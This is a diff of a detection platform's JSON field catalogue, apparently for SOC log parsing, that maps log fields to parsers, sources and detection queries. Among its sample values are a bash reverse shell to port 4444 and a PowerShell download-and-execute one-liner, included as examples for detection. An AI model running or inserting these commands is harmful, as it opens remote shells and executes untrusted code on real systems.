+        "cloud_guard_instance_security_raw_result_detail.json"
       ],
       "dashboards_using_it": [],
       "reserved_backing_field": ""
@@ -6659,6 +7622,115 @@
         "insecure_direct_object_reference_detected.json",
         "web_application_authentication_bypass.json",
         "web_application_session_hijacking_indicators.json"
+      ],
+      "dashboards_using_it": [],
+      "reserved_backing_field": ""
+    },
+    {
+      "display_name": "Pack Name",
+      "kind": "custom",
+      "type": "STRING",
+      "raw_json_paths": [
+        "$.pack.name"
+      ],
+      "parsers": [
+        {
+          "parser_name": "socCloudGuardInstanceSecurityJsonParser",
+          "parser_display": "SOC Cloud Guard Instance Security JSON Parser",
+          "sequence": 15,
+          "raw_json_path": "$.pack.name"
+        }
+      ],
+      "sources": [
+        {
+          "source_internal": "socCloudGuardInstanceSecuritySource",
+          "source_display": "SOC Cloud Guard Instance Security Logs"
+        }
+      ],
+      "source_candidate_groups": [
+        "cloud_guard_instance_security",
+        "osquery_results"
+      ],
+      "example_values": [
+        "network-exposure"
+      ],
+      "contract_datasets": [],
+      "queries_using_it": [
+        "cloud_guard_instance_security_findings_by_host.json",
+        "cloud_guard_instance_security_findings_by_pack_query.json",
+        "cloud_guard_instance_security_pack_coverage.json",
+        "cloud_guard_instance_security_raw_result_detail.json"
+      ],
+      "dashboards_using_it": [],
+      "reserved_backing_field": ""
+    },
+    {
+      "display_name": "Pack Query ID",
+      "kind": "custom",
+      "type": "STRING",
+      "raw_json_paths": [
+        "$.pack.query_id"
+      ],
+      "parsers": [
+        {
+          "parser_name": "socCloudGuardInstanceSecurityJsonParser",
+          "parser_display": "SOC Cloud Guard Instance Security JSON Parser",
+          "sequence": 16,
+          "raw_json_path": "$.pack.query_id"
+        }
+      ],
+      "sources": [
+        {
+          "source_internal": "socCloudGuardInstanceSecuritySource",
+          "source_display": "SOC Cloud Guard Instance Security Logs"
+        }
+      ],
+      "source_candidate_groups": [
+        "cloud_guard_instance_security",
+        "osquery_results"
+      ],
+      "example_values": [
+        "unexpected_listeners"
+      ],
+      "contract_datasets": [],
+      "queries_using_it": [
+        "cloud_guard_instance_security_findings_by_pack_query.json",
+        "cloud_guard_instance_security_raw_result_detail.json"
+      ],
+      "dashboards_using_it": [],
+      "reserved_backing_field": ""
+    },
+    {
+      "display_name": "Pack Query Name",
+      "kind": "custom",
+      "type": "STRING",
+      "raw_json_paths": [
+        "$.pack.query_name"
+      ],
+      "parsers": [
+        {
+          "parser_name": "socCloudGuardInstanceSecurityJsonParser",
+          "parser_display": "SOC Cloud Guard Instance Security JSON Parser",
+          "sequence": 17,
+          "raw_json_path": "$.pack.query_name"
+        }
+      ],
+      "sources": [
+        {
+          "source_internal": "socCloudGuardInstanceSecuritySource",
+          "source_display": "SOC Cloud Guard Instance Security Logs"
+        }
+      ],
+      "source_candidate_groups": [
+        "cloud_guard_instance_security",
+        "osquery_results"
+      ],
+      "example_values": [
+        "Unexpected listeners"
+      ],
+      "contract_datasets": [],
+      "queries_using_it": [
+        "cloud_guard_instance_security_findings_by_pack_query.json"
       ],
       "dashboards_using_it": [],
       "reserved_backing_field": ""
@@ -6840,6 +7912,7 @@
         "bluelight_browser_child_process.json",
         "bluelight_file_discovery.json",
         "bluelight_system_discovery.json",
+        "clickfix_fake_captcha_powershell_execution.json",
         "dcom_lateral_movement_via_mmc20.json",
         "hunting/bluelight_attack_path_link.json",
         "hunting/bluelight_kill_chain_timeline.json",
@@ -6899,7 +7972,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         ""
@@ -6948,7 +8022,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "4242"
@@ -6989,7 +8064,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [],
       "contract_datasets": [],
@@ -7019,7 +8095,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         true
@@ -7081,7 +8158,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "visa"
@@ -7126,7 +8204,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "simulated"
@@ -7161,7 +8240,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         true
@@ -7195,7 +8275,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "<URL>"
@@ -7246,7 +8327,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         97
@@ -7293,7 +8375,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "redirected"
@@ -7339,7 +8422,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [],
       "contract_datasets": [],
@@ -7567,6 +8651,12 @@
       ],
       "parsers": [
         {
+          "parser_name": "socCloudGuardInstanceSecurityJsonParser",
+          "parser_display": "SOC Cloud Guard Instance Security JSON Parser",
+          "sequence": 23,
+          "raw_json_path": "$.process.command_line"
+        },
+        {
           "parser_name": "socApplicationJsonParser",
           "parser_display": "SOC Application JSON Parser",
           "sequence": 109,
@@ -7575,19 +8665,36 @@
       ],
       "sources": [
         {
+          "source_internal": "socCloudGuardInstanceSecuritySource",
+          "source_display": "SOC Cloud Guard Instance Security Logs"
+        },
+        {
           "source_internal": "socApplicationSource",
           "source_display": "SOC Application Logs"
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom",
+        "cloud_guard_instance_security",
+        "osquery_results"
       ],
       "example_values": [
+        "bash -i >& /dev/tcp/<IP_ADDRESS>/4444 0>&1",
         "nginx -s reload"
       ],
       "contract_datasets": [],
       "queries_using_it": [
-        "apps/apm_octo_compromised_vm_pivots.json"
+        "apps/apm_octo_compromised_vm_pivots.json",
+        "apps/oke_boopkit_attack_timeline.json",
+        "apps/oke_ebpf_rootkit_activity.json",
+        "apps/oke_exec_and_node_escape.json",
+        "apps/oke_privileged_workload_creation.json",
+        "apps/oke_rule_boopkit_ebpf_rootkit_count.json",
+        "apps/oke_rule_privileged_workload_count.json",
+        "apps/oke_secrets_and_rbac_abuse.json",
+        "cloud_guard_instance_security_high_severity_pivots.json",
+        "cloud_guard_instance_security_raw_result_detail.json"
       ],
       "dashboards_using_it": [],
       "reserved_backing_field": ""
@@ -7691,9 +8798,9 @@
       "raw_json_paths": [
         "$.Process",
         "$.Image",
+        "$.process.name",
         "$.ProcessName",
-        "$.SourceImage",
-        "$.process.name"
+        "$.SourceImage"
       ],
       "parsers": [
         {
@@ -7709,9 +8816,21 @@
           "raw_json_path": "$.Image"
         },
         {
+          "parser_name": "socCloudGuardInstanceSecurityJsonParser",
+          "parser_display": "SOC Cloud Guard Instance Security JSON Parser",
+          "sequence": 22,
+          "raw_json_path": "$.process.name"
+        },
+        {
           "parser_name": "socWinEventSecurityJsonParser",
           "parser_display": "SOC Windows Event Security JSON Parser",
           "sequence": 8,
+          "raw_json_path": "$.ProcessName"
+        },
+        {
+          "parser_name": "socWinPowerShellOperationalJsonParser",
+          "parser_display": "SOC Windows PowerShell Operational JSON Parser",
+          "sequence": 12,
           "raw_json_path": "$.ProcessName"
         },
         {
@@ -7749,8 +8868,16 @@
           "source_display": "SOC Windows Sysmon Logs"
         },
         {
+          "source_internal": "socCloudGuardInstanceSecuritySource",
+          "source_display": "SOC Cloud Guard Instance Security Logs"
+        },
+        {
           "source_internal": "socWinEventSecuritySource",
           "source_display": "Windows Event Security Logs"
+        },
+        {
+          "source_internal": "socWinPowerShellOperationalSource",
+          "source_display": "Windows PowerShell Operational Logs"
         },
         {
           "source_internal": "socLinuxSecureSource",
@@ -7771,17 +8898,23 @@
       ],
       "source_candidate_groups": [
         "application_logs",
+        "azure_log_analytics_custom",
+        "cloud_guard_instance_security",
         "linux_secure",
         "linux_syslog",
+        "osquery_results",
         "sysmon_network",
         "sysmon_operational",
         "windows_event_security",
+        "windows_powershell_operational",
         "windows_sysmon"
       ],
       "example_values": [
         "sshd",
         "C:\\Windows\\System32\\powershell.exe",
+        "bash",
         "C:\\Windows\\System32\\lsass.exe",
+        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "C:\\Windows\\System32\\cmd.exe",
         "nginx"
       ],
@@ -7815,6 +8948,7 @@
         "bluelight_yara_pdb_strings.json",
         "bluelight_yara_system_recon.json",
         "boot_configuration_change_for_persistence.json",
+        "clickfix_fake_captcha_powershell_execution.json",
         "cmstp_uac_bypass.json",
         "compiled_html_file_execution.json",
         "control_panel_item_execution.json",
@@ -7841,6 +8975,8 @@
         "hunting/clickfix_clipboard_powershell_execution.json",
         "hunting/clickfix_lolbin_payload_execution.json",
         "hunting/compromised_machines_and_data_2025_2026.json",
+        "hunting/coordinator_mitre_sunburst.json",
+        "hunting/coordinator_mitre_techniques_kpi.json",
         "hunting/crashfix_python_rat_activity.json",
         "hunting/flf_bits_exfiltration.json",
         "hunting/flf_cloud_service_exfiltration.json",
@@ -7950,6 +9086,7 @@
         "sysmon_c2_beacon_-_periodic_outbound_https.json",
         "sysmon_cobalt_strike_c2_network_indicators.json",
         "sysmon_dns_tunneling_via_network_connection.json",
+        "sysmon_executable_file_created_or_detected.json",
         "sysmon_kerberoasting_network_indicator.json",
         "sysmon_lateral_movement_via_smb.json",
         "sysmon_lateral_movement_via_winrm.json",
@@ -8062,7 +9199,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [],
       "contract_datasets": [],
@@ -8132,7 +9270,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [],
       "contract_datasets": [],
@@ -8249,6 +9388,18 @@
           "raw_json_path": "$.Provider"
         },
         {
+          "parser_name": "socWinPowerShellOperationalJsonParser",
+          "parser_display": "SOC Windows PowerShell Operational JSON Parser",
+          "sequence": 7,
+          "raw_json_path": "$.Provider"
+        },
+        {
+          "parser_name": "socWindowsDefenderOperationalJsonParser",
+          "parser_display": "SOC Windows Defender Operational JSON Parser",
+          "sequence": 7,
+          "raw_json_path": "$.Provider"
+        },
+        {
           "parser_name": "socApplicationJsonParser",
           "parser_display": "SOC Application JSON Parser",
           "sequence": 180,
@@ -8267,19 +9418,35 @@
           "source_display": "SOC Windows Sysmon Logs"
         },
         {
+          "source_internal": "socWinPowerShellOperationalSource",
+          "source_display": "Windows PowerShell Operational Logs"
+        },
+        {
+          "source_internal": "socWindowsDefenderOperationalSource",
+          "source_display": "Windows Defender Operational Logs"
+        },
+        {
           "source_internal": "socApplicationSource",
           "source_display": "SOC Application Logs"
         }
       ],
       "source_candidate_groups": [
         "application_logs",
+        "azure_log_analytics_custom",
         "sysmon_operational",
+        "windows_defender_operational",
+        "windows_powershell_operational",
         "windows_sysmon"
       ],
       "example_values": [
-        "Microsoft-Windows-Sysmon"
+        "Microsoft-Windows-Sysmon",
+        "Microsoft-Windows-PowerShell",
+        "Microsoft-Windows-Windows Defender"
       ],
-      "contract_datasets": [],
+      "contract_datasets": [
+        "windows_defender_operational.jsonl",
+        "windows_powershell_operational.jsonl"
+      ],
       "queries_using_it": [],
       "dashboards_using_it": [],
       "reserved_backing_field": ""
@@ -8422,6 +9589,7 @@
       ],
       "source_candidate_groups": [
         "application_logs",
+        "azure_log_analytics_custom",
         "lb_access",
         "waf_security",
         "webapp_security"
@@ -8479,6 +9647,7 @@
       ],
       "source_candidate_groups": [
         "application_logs",
+        "azure_log_analytics_custom",
         "lb_access",
         "waf_security"
       ],
@@ -8509,6 +9678,12 @@
           "raw_json_path": "$.region"
         },
         {
+          "parser_name": "socCloudGuardInstanceSecurityJsonParser",
+          "parser_display": "SOC Cloud Guard Instance Security JSON Parser",
+          "sequence": 6,
+          "raw_json_path": "$.region"
+        },
+        {
           "parser_name": "socMulticloudHealthJsonParser",
           "parser_display": "SOC Multicloud Health JSON Parser",
           "sequence": 4,
@@ -8521,16 +9696,23 @@
           "source_display": "SOC Cloud Guard Logs"
         },
         {
+          "source_internal": "socCloudGuardInstanceSecuritySource",
+          "source_display": "SOC Cloud Guard Instance Security Logs"
+        },
+        {
           "source_internal": "socMulticloudHealthSource",
           "source_display": "SOC Multicloud Health Logs"
         }
       ],
       "source_candidate_groups": [
         "cloud_guard",
-        "multicloud_health"
+        "cloud_guard_instance_security",
+        "multicloud_health",
+        "osquery_results"
       ],
       "example_values": [
         "us-phoenix-1",
+        "us-ashburn-1",
         "eu-frankfurt-1"
       ],
       "contract_datasets": [
@@ -8574,6 +9756,40 @@
         "multicloud_health.jsonl"
       ],
       "queries_using_it": [],
+      "dashboards_using_it": [],
+      "reserved_backing_field": ""
+    },
+    {
+      "display_name": "Relative Target Name",
+      "kind": "custom",
+      "type": "STRING",
+      "raw_json_paths": [
+        "$.RelativeTargetName"
+      ],
+      "parsers": [
+        {
+          "parser_name": "socWinEventSecurityJsonParser",
+          "parser_display": "SOC Windows Event Security JSON Parser",
+          "sequence": 31,
+          "raw_json_path": "$.RelativeTargetName"
+        }
+      ],
+      "sources": [
+        {
+          "source_internal": "socWinEventSecuritySource",
+          "source_display": "Windows Event Security Logs"
+        }
+      ],
+      "source_candidate_groups": [
+        "windows_event_security"
+      ],
+      "example_values": [
+        "Windows\\Temp\\payload.exe"
+      ],
+      "contract_datasets": [],
+      "queries_using_it": [
+        "windows_admin_share_access_spike_event.json"
+      ],
       "dashboards_using_it": [],
       "reserved_backing_field": ""
     },
@@ -8711,6 +9927,7 @@
       ],
       "source_candidate_groups": [
         "application_logs",
+        "azure_log_analytics_custom",
         "webapp_security"
       ],
       "example_values": [
@@ -8780,7 +9997,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [],
       "contract_datasets": [],
@@ -8848,6 +10066,7 @@
       ],
       "source_candidate_groups": [
         "application_logs",
+        "azure_log_analytics_custom",
         "lb_access",
         "waf_security",
         "webapp_security"
@@ -8866,6 +10085,7 @@
       ],
       "queries_using_it": [
         "api_endpoint_unauthorized_access_attempts.json",
+        "apm_sql_injection_attack_in_request.json",
         "apps/apm_clickjacking_detection.json",
         "apps/apm_csrf_violation_detection.json",
         "apps/apm_dom_attack_detection.json",
@@ -9114,6 +10334,7 @@
       ],
       "source_candidate_groups": [
         "application_logs",
+        "azure_log_analytics_custom",
         "lb_access",
         "waf_security",
         "webapp_security"
@@ -9175,7 +10396,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "Content-Type: text/html; charset=utf-8"
@@ -9228,6 +10450,7 @@
       ],
       "source_candidate_groups": [
         "application_logs",
+        "azure_log_analytics_custom",
         "multicloud_health"
       ],
       "example_values": [
@@ -9270,7 +10493,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [],
       "contract_datasets": [],
@@ -9294,6 +10518,12 @@
           "raw_json_path": "$.riskLevel"
         },
         {
+          "parser_name": "socCloudGuardInstanceSecurityJsonParser",
+          "parser_display": "SOC Cloud Guard Instance Security JSON Parser",
+          "sequence": 7,
+          "raw_json_path": "$.riskLevel"
+        },
+        {
           "parser_name": "socApplicationJsonParser",
           "parser_display": "SOC Application JSON Parser",
           "sequence": 30,
@@ -9306,13 +10536,20 @@
           "source_display": "SOC Cloud Guard Logs"
         },
         {
+          "source_internal": "socCloudGuardInstanceSecuritySource",
+          "source_display": "SOC Cloud Guard Instance Security Logs"
+        },
+        {
           "source_internal": "socApplicationSource",
           "source_display": "SOC Application Logs"
         }
       ],
       "source_candidate_groups": [
         "application_logs",
-        "cloud_guard"
+        "azure_log_analytics_custom",
+        "cloud_guard",
+        "cloud_guard_instance_security",
+        "osquery_results"
       ],
       "example_values": [
         "HIGH",
@@ -9525,7 +10762,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "run-octo-attack-lab-001"
@@ -9534,7 +10772,45 @@
       "queries_using_it": [
         "apps/apm_octo_attack_timeline.json",
         "apps/apm_octo_attack_trace_correlation.json",
-        "apps/apm_octo_payment_threats.json"
+        "apps/apm_octo_payment_threats.json",
+        "apps/oke_boopkit_attack_timeline.json"
+      ],
+      "dashboards_using_it": [],
+      "reserved_backing_field": ""
+    },
+    {
+      "display_name": "Script Block Text",
+      "kind": "custom",
+      "type": "STRING",
+      "raw_json_paths": [
+        "$.ScriptBlockText"
+      ],
+      "parsers": [
+        {
+          "parser_name": "socWinPowerShellOperationalJsonParser",
+          "parser_display": "SOC Windows PowerShell Operational JSON Parser",
+          "sequence": 9,
+          "raw_json_path": "$.ScriptBlockText"
+        }
+      ],
+      "sources": [
+        {
+          "source_internal": "socWinPowerShellOperationalSource",
+          "source_display": "Windows PowerShell Operational Logs"
+        }
+      ],
+      "source_candidate_groups": [
+        "windows_powershell_operational"
+      ],
+      "example_values": [
+        "IEX(New-Object Net.WebClient).DownloadString('<URL>')"
+      ],
+      "contract_datasets": [
+        "windows_powershell_operational.jsonl"
+      ],
+      "queries_using_it": [
+        "clickfix_fake_captcha_powershell_execution.json",
+        "windows_powershell_script_block_suspicious_content.json"
       ],
       "dashboards_using_it": [],
       "reserved_backing_field": ""
@@ -9568,7 +10844,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [],
       "contract_datasets": [],
@@ -9581,9 +10858,16 @@
       "kind": "custom",
       "type": "STRING",
       "raw_json_paths": [
+        "$.severity",
         "$.security.severity"
       ],
       "parsers": [
+        {
+          "parser_name": "socCloudGuardInstanceSecurityJsonParser",
+          "parser_display": "SOC Cloud Guard Instance Security JSON Parser",
+          "sequence": 8,
+          "raw_json_path": "$.severity"
+        },
         {
           "parser_name": "socApplicationJsonParser",
           "parser_display": "SOC Application JSON Parser",
@@ -9593,21 +10877,37 @@
       ],
       "sources": [
         {
+          "source_internal": "socCloudGuardInstanceSecuritySource",
+          "source_display": "SOC Cloud Guard Instance Security Logs"
+        },
+        {
           "source_internal": "socApplicationSource",
           "source_display": "SOC Application Logs"
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom",
+        "cloud_guard_instance_security",
+        "osquery_results"
       ],
       "example_values": [
         "critical"
       ],
-      "contract_datasets": [],
+      "contract_datasets": [
+        "application_logs.jsonl"
+      ],
       "queries_using_it": [
         "apps/apm_octo_api_gateway_edge.json",
         "apps/apm_octo_attack_timeline.json",
-        "apps/apm_octo_osquery_findings.json"
+        "apps/apm_octo_osquery_findings.json",
+        "apps/oke_boopkit_attack_timeline.json",
+        "apps/oke_ebpf_rootkit_activity.json",
+        "apps/oke_exec_and_node_escape.json",
+        "apps/oke_kubernetes_attack_overview.json",
+        "apps/oke_privileged_workload_creation.json",
+        "apps/oke_secrets_and_rbac_abuse.json",
+        "cloud_guard_instance_security_high_severity_pivots.json"
       ],
       "dashboards_using_it": [],
       "reserved_backing_field": ""
@@ -9634,7 +10934,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "octo-shop-vm-01"
@@ -9673,7 +10974,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "enterprise-crm-portal"
@@ -9682,6 +10984,52 @@
         "application_logs.jsonl"
       ],
       "queries_using_it": [],
+      "dashboards_using_it": [],
+      "reserved_backing_field": ""
+    },
+    {
+      "display_name": "Service File Name",
+      "kind": "custom",
+      "type": "STRING",
+      "raw_json_paths": [
+        "$.ServiceFileName"
+      ],
+      "parsers": [
+        {
+          "parser_name": "socWinEventSecurityJsonParser",
+          "parser_display": "SOC Windows Event Security JSON Parser",
+          "sequence": 32,
+          "raw_json_path": "$.ServiceFileName"
+        },
+        {
+          "parser_name": "socWinEventSystemJsonParser",
+          "parser_display": "SOC Windows Event System JSON Parser",
+          "sequence": 8,
+          "raw_json_path": "$.ServiceFileName"
+        }
+      ],
+      "sources": [
+        {
+          "source_internal": "socWinEventSecuritySource",
+          "source_display": "Windows Event Security Logs"
+        },
+        {
+          "source_internal": "socWinEventSystemSource",
+          "source_display": "Windows Event System Logs"
+        }
+      ],
+      "source_candidate_groups": [
+        "windows_event_security",
+        "windows_event_system"
+      ],
+      "example_values": [
+        "C:\\Windows\\Temp\\payload.exe",
+        "C:\\Windows\\Temp\\agent.exe"
+      ],
+      "contract_datasets": [],
+      "queries_using_it": [
+        "windows_service_installed_event_log.json"
+      ],
       "dashboards_using_it": [],
       "reserved_backing_field": ""
     },
@@ -9746,7 +11094,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "crm-portal-01"
@@ -9838,6 +11187,7 @@
       ],
       "source_candidate_groups": [
         "application_logs",
+        "azure_log_analytics_custom",
         "multicloud_health",
         "waf_security",
         "windows_event_security",
@@ -9889,8 +11239,13 @@
         "apps/app_slow_requests.json",
         "apps/app_sqli_xss_detection.json",
         "apps/app_waf_signal_correlation.json",
+        "apps/oke_boopkit_attack_timeline.json",
+        "apps/oke_exec_and_node_escape.json",
+        "apps/oke_kubernetes_attack_overview.json",
+        "apps/oke_privileged_workload_creation.json",
         "hunting/browser_attack_frequency_analysis.json",
-        "kerberoasting_rc4_ticket_request.json"
+        "kerberoasting_rc4_ticket_request.json",
+        "windows_service_installed_event_log.json"
       ],
       "dashboards_using_it": [],
       "reserved_backing_field": ""
@@ -9924,7 +11279,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "octo"
@@ -9954,7 +11310,16 @@
         "apps/apm_octo_span_latency_hotspots.json",
         "apps/apm_octo_span_link.json",
         "apps/apm_octo_trace_investigation_tiles.json",
-        "apps/apm_octo_trace_logs_correlation.json"
+        "apps/apm_octo_trace_logs_correlation.json",
+        "apps/oke_boopkit_attack_timeline.json",
+        "apps/oke_ebpf_rootkit_activity.json",
+        "apps/oke_exec_and_node_escape.json",
+        "apps/oke_kubernetes_attack_overview.json",
+        "apps/oke_kubernetes_attack_path_link.json",
+        "apps/oke_privileged_workload_creation.json",
+        "apps/oke_rule_boopkit_ebpf_rootkit_count.json",
+        "apps/oke_rule_privileged_workload_count.json",
+        "apps/oke_secrets_and_rbac_abuse.json"
       ],
       "dashboards_using_it": [],
       "reserved_backing_field": ""
@@ -9981,7 +11346,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "1.1.0"
@@ -10037,6 +11403,7 @@
       ],
       "source_candidate_groups": [
         "application_logs",
+        "azure_log_analytics_custom",
         "network_firewall",
         "webapp_security"
       ],
@@ -10090,10 +11457,17 @@
       "kind": "built-in",
       "type": "STRING",
       "raw_json_paths": [
+        "$.Severity",
         "$.level",
         "$.severity"
       ],
       "parsers": [
+        {
+          "parser_name": "socWindowsDefenderOperationalJsonParser",
+          "parser_display": "SOC Windows Defender Operational JSON Parser",
+          "sequence": 13,
+          "raw_json_path": "$.Severity"
+        },
         {
           "parser_name": "socApplicationJsonParser",
           "parser_display": "SOC Application JSON Parser",
@@ -10109,18 +11483,26 @@
       ],
       "sources": [
         {
+          "source_internal": "socWindowsDefenderOperationalSource",
+          "source_display": "Windows Defender Operational Logs"
+        },
+        {
           "source_internal": "socApplicationSource",
           "source_display": "SOC Application Logs"
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom",
+        "windows_defender_operational"
       ],
       "example_values": [
+        "High",
         "INFO"
       ],
       "contract_datasets": [
-        "application_logs.jsonl"
+        "application_logs.jsonl",
+        "linux_syslog.jsonl"
       ],
       "queries_using_it": [],
       "dashboards_using_it": [],
@@ -10181,6 +11563,7 @@
       ],
       "source_candidate_groups": [
         "application_logs",
+        "azure_log_analytics_custom",
         "linux_secure",
         "linux_syslog",
         "network_firewall"
@@ -10199,6 +11582,40 @@
         "apps/app_db_performance_correlation.json",
         "apps/app_error_rate_by_service.json",
         "apps/app_service_health_timeline.json"
+      ],
+      "dashboards_using_it": [],
+      "reserved_backing_field": ""
+    },
+    {
+      "display_name": "Share Name",
+      "kind": "custom",
+      "type": "STRING",
+      "raw_json_paths": [
+        "$.ShareName"
+      ],
+      "parsers": [
+        {
+          "parser_name": "socWinEventSecurityJsonParser",
+          "parser_display": "SOC Windows Event Security JSON Parser",
+          "sequence": 30,
+          "raw_json_path": "$.ShareName"
+        }
+      ],
+      "sources": [
+        {
+          "source_internal": "socWinEventSecuritySource",
+          "source_display": "Windows Event Security Logs"
+        }
+      ],
+      "source_candidate_groups": [
+        "windows_event_security"
+      ],
+      "example_values": [
+        "\\\\*\\C$"
+      ],
+      "contract_datasets": [],
+      "queries_using_it": [
+        "windows_admin_share_access_spike_event.json"
       ],
       "dashboards_using_it": [],
       "reserved_backing_field": ""
@@ -10232,7 +11649,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "false",
@@ -10290,7 +11708,11 @@
       ],
       "queries_using_it": [
         "brute_force_failed_logon_spike.json",
-        "lateral_movement_logon_pattern.json"
+        "lateral_movement_logon_pattern.json",
+        "windows_account_or_group_enumeration_spike.json",
+        "windows_admin_share_access_spike_event.json",
+        "windows_kerberos_pre_authentication_failures.json",
+        "windows_ntlm_authentication_failures.json"
       ],
       "dashboards_using_it": [],
       "reserved_backing_field": ""
@@ -10301,8 +11723,8 @@
       "type": "STRING",
       "raw_json_paths": [
         "$.SourceIP",
-        "$.SourceIp",
         "$.source.ip",
+        "$.SourceIp",
         "$.data.sourceAddress",
         "$.logContent.data.src"
       ],
@@ -10312,6 +11734,12 @@
           "parser_display": "SOC Linux Syslog JSON Parser",
           "sequence": 9,
           "raw_json_path": "$.SourceIP"
+        },
+        {
+          "parser_name": "socCloudGuardInstanceSecurityJsonParser",
+          "parser_display": "SOC Cloud Guard Instance Security JSON Parser",
+          "sequence": 25,
+          "raw_json_path": "$.source.ip"
         },
         {
           "parser_name": "socLinuxSecureJsonParser",
@@ -10350,6 +11778,10 @@
           "source_display": "SOC Linux Syslog Logs"
         },
         {
+          "source_internal": "socCloudGuardInstanceSecuritySource",
+          "source_display": "SOC Cloud Guard Instance Security Logs"
+        },
+        {
           "source_internal": "socLinuxSecureSource",
           "source_display": "Linux Secure Logs"
         },
@@ -10372,9 +11804,12 @@
       ],
       "source_candidate_groups": [
         "application_logs",
+        "azure_log_analytics_custom",
+        "cloud_guard_instance_security",
         "linux_secure",
         "linux_syslog",
         "network_firewall",
+        "osquery_results",
         "sysmon_network",
         "vcn_flow"
       ],
@@ -10387,6 +11822,8 @@
         "vcn_flow.jsonl"
       ],
       "queries_using_it": [
+        "apps/oke_boopkit_attack_timeline.json",
+        "apps/oke_secrets_and_rbac_abuse.json",
         "bluelight_drive_by_compromise.json",
         "bluelight_onedrive_exfiltration.json",
         "hunting/c2_affected_hosts_kpi.json",
@@ -10443,7 +11880,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [],
       "contract_datasets": [],
@@ -10599,7 +12037,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "document.cookie canvas.toDataURL webgl.getParameter"
@@ -10609,6 +12048,12 @@
         "apps/apm_browser_fingerprinting.json",
         "apps/apm_dom_attack_detection.json",
         "apps/apm_suspicious_js_patterns.json",
+        "apps/oke_ebpf_rootkit_activity.json",
+        "apps/oke_exec_and_node_escape.json",
+        "apps/oke_privileged_workload_creation.json",
+        "apps/oke_rule_boopkit_ebpf_rootkit_count.json",
+        "apps/oke_rule_privileged_workload_count.json",
+        "apps/oke_secrets_and_rbac_abuse.json",
         "hunting/sharepoint_toolshell_exploitation.json",
         "hunting/sharepoint_toolshell_webshell_post_exploit.json"
       ],
@@ -10657,7 +12102,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "span_demo_root_001"
@@ -10672,7 +12118,10 @@
         "apps/apm_octo_span_latency_hotspots.json",
         "apps/apm_octo_span_link.json",
         "apps/apm_octo_trace_investigation_tiles.json",
-        "apps/apm_octo_trace_logs_correlation.json"
+        "apps/apm_octo_trace_logs_correlation.json",
+        "apps/oke_boopkit_attack_timeline.json",
+        "apps/oke_kubernetes_attack_overview.json",
+        "apps/oke_kubernetes_attack_path_link.json"
       ],
       "dashboards_using_it": [],
       "reserved_backing_field": ""
@@ -10699,7 +12148,8 @@
         }
       ],
